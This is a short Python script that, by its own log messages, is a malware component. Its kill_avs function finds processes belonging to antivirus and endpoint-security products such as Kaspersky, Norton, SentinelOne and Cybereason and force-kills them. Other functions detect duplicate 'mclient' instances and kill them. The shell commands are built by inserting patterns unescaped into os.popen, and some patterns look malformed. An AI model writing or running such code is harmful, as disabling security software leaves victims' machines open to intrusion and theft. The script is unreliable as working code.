#!/usr/bin/python3
import logging
import os
import signal
from time import sleep
import time

def get_pids(regex):
    cmd = f"ps -aef | grep -i -E '{regex}' | grep -v 'grep' | awk '{{print $2}}'" 
    output = os.popen(cmd).read()
    pids = output.replace('PID','').strip().split('\n')
    pids = [int(pid) for pid in pids if pid != '']    
    logging.info(f"Malware pids: {pids}")
    return pids

def get_times(regex):
    cmd = f"ps -aef | grep -i -E '{regex}' | grep -v 'grep' | awk '{{print $5}}'" 
    output = os.popen(cmd).read()
    times = output.replace('Time','').strip().split('\n')
    logging.info(f"Malware times: {times}")
    return times

def kill_avs(avs: list = ['antivirus', 'kaspersky', 'norton', 'corwdstrike', 'deepinstinct', 'sentinelone', 'checkpoint', 'cybereason']):
    avs = [ f"{av}" for av in avs]
    logging.info(avs)
    for av in avs:
        pids = get_pids(av)
        logging.info(f"Check for: {av} found pids: {pids} killing processes...")
        for pid in get_pids(av):
            os.kill(pid, signal.SIGKILL)

def check_parent():
    my_pid = os.getpid()
    my_time = get_times(str(my_pid))
    for time in get_times('*mclient$'):
        if str(my_time[0]) != time:
            print("hi")
            return True
    return False # malware first run

def wait_parent():
    sleep(30)
    my_pid = os.getpid()
    my_time = get_times(str(my_pid))
    for (poc,time) in zip(get_pids('*mclient$'),get_times('*mclient$')):
        if time != str(my_time[0]):
            os.kill(poc, signal.SIGKILL)